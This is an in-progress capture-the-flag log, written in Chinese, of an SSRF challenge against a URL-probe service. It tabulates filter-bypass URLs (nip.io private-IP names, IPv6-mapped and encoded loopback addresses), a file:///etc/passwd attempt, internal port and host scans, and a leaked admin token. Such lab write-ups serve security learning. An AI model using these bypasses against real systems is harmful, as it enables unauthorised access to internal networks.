# a-16 · 探索记录（进行中）

对应题解：[`a-16.md`](./a-16.md)。

> 本文记录截至目前尝试。**flag 尚未取得**。

## 目标与起点

题面：「内网资产探测服务，运维可通过输入目标 URL 做连通性检测，并查看目标响应。Flag 在某个内网服务中。攻击者发现了内网接口 `http://internal-api:5000/debug/config`。」

启动后 `Werkzeug 3.1.7` + `Python 3.9`，登录页直接给出 `admin/Password123`，登录后是一个 URL 探测表单：

```
GET/POST /probe
  target_url=<URL>
  timeout=3|5|10|30
  follow_redirect=on
```

响应里会回显：状态码、内容长度、Content-Type、响应体预览（HTML 转义）。

## 第一阶段：过滤器边界

普通公网地址能探测（`http://web/` 返回 200）。内网目标被多道规则拦：

| 目标 | 结果 | 判据 |
| --- | --- | --- |
| `http://10.0.167.248:5000/…` | `禁止访问内网地址` | 私有网段字面量 |
| `http://172.19.0.2:5000/…` | `禁止访问内网地址` | 同上 |
| `http://127.0.0.1:5000/…` | `访问被阻止` | loopback 字面量 |
| `http://localhost:5000/…` | `访问被阻止` | 主机名黑名单 |
| `http://internal-api:5000/…` | `访问被阻止` | 主机名黑名单（含 `internal`） |
| `http://0x7f000001:5000/…` | `连接错误` | 不做十六进制解析 |
| `http://2130706433:5000/…` | `连接错误` | 不做十进制解析 |
| `http://127.1:5000/…` | `连接错误` | 不做短格式解析 |
| `http://[::1]:5000/…` | `连接错误` | — |
| `http://0.0.0.0:5000/…` | `访问被阻止` | — |
| `file:///etc/passwd` | `不支持的协议：file` | 只允许 http/https |

## 第二阶段：绕过 IP 检查（成功）

两类写法有效：

1. **DNS 名字指向私网 IP**：`http://172.18.0.2.nip.io:5000/`。过滤器只看「字面量是否像内网地址」，`nip.io` 解析后是私网，规则不覆盖。
2. **IPv6-mapped 形式**：`http://[::ffff:172.19.0.3]:5000/` 也能过 IP 检查（返回超时而非「禁止访问内网」）。

用 (1) 扫网段定位到内网服务：

| 目标 | 结果 |
| --- | --- |
| `172.17.0.2/3:5000` | 超时 |
| **`172.18.0.2:5000`** | **探测成功** |
| `172.18.0.3:80` | 探测成功（就是探测服务自己的另一实例） |
| `172.19.*`、`172.20.*`、`172.21.*` | 超时 |

同时确认 `172.18.0.1:8080` 有一个 Go 服务（`/health` 返回 `{"cpu_percent":…,"resource_instance_id":"VM-…","running_range_count":2}`），这是平台的运行时探针，不是题目容器。

## 第三阶段：内网 API 的暴露面

`http://172.18.0.2.nip.io:5000/` 是「internal-api」。用探测器的响应体预览做目录枚举：

```
GET /health        → 200 {"status":"healthy"}
GET /status        → 200 {"service":"internal-api","status":"running","version":"1.0.0"}
GET /debug/config  → 200 {"api":{"admin_token":"internal_admin_token_2024",
                                 "internal_url":"http://internal-api:5000"},
                          "database":{"host":"localhost","name":"internal_db","port":3306}}
```

其余 80+ 个候选路径（`/admin`、`/flag`、`/api/*`、`/debug/env`、`/backup`、`/metrics`…）全部 404。

**已拿到的东西：`admin_token = internal_admin_token_2024`、`internal_url`、数据库名/端口。**

## 第四阶段：token 试用到所有已知位置（全部失败）

| 用法 | 结果 |
| --- | --- |
| 探测器请求内网 API 时带 `X-Admin-Token` / `Authorization: Bearer` 头 | 预览内容与不带一致（404/200 相同） |
| `?token=` / `?admin_token=` / `?api_key=` query | 同上 |
| `http://<token>@172.18.0.2.nip.io:5000/…`（userinfo） | 同上 |
| 对探测服务本身带 `X-Admin-Token` 访问 `/admin`、`/flag`、`/debug/config` | 全 404 |
| Cookie `admin_token=…` 访问探测服务 `/admin` | 404 |

**探测器的 `/probe` 只接受 URL，没有字段能设置转发头**（试过 `headers={...}`、`header=…`、`cookie=…`、`auth=…`），所以「带管理员 token 访问受保护端点」这条路走不通。

## 第五阶段：其它可能性

| 方向 | 结果 |
| --- | --- |
| 内网其它端口（5001/8000/8080/8443/9000/9090/3000/3306/6379，在 172.18.0.2 上） | 全部 `连接错误` |
| 内网其它主机 172.18.0.4~.12（80/3000/5000/8080） | 全部超时 |
| 探测服务自身路由枚举（`/admin`、`/probe`、`/login`、`/logout`、`/static`…） | 只有 `login`、`logout`、`probe`、`/` |
| `/api/*` 在探测服务上 | 全 404 |
| 用 `web` 的开放重定向跳到内网 | `web/logout?next=` 只跳自己的 `/`，不带外站 |

## 目前的判断

1. SSRF 已经能打内网，`admin_token` 也已泄露，但**找不到消费这个 token 的端点**。
2. 内网 API 只暴露 `/health`、`/status`、`/debug/config` 三个端点，枚举 80+ 路径无新发现。
3. token 的使用方式可能是「另一个尚未发现的入口」：例如探测服务本身有一个需要管理员身份的调试端点，或者内网还有第二台机器。

## 下一步计划

- 用更大的字典（`directory-list`/raft 级别）重新枚举 `172.18.0.2:5000` 与探测服务自身。
- 试 `POST`/`PUT`/`DELETE` 方法打在 `/debug/config` 等已知端点上（是否接受修改配置）。
- 试把 `admin_token` 当作 **post 参数** 传给 `/probe`（`target_url=…&admin_token=…`）。
- 若内网 API 确实只有三个只读端点，则本题可能需要 `internal_url` 之外的第二个主机名。
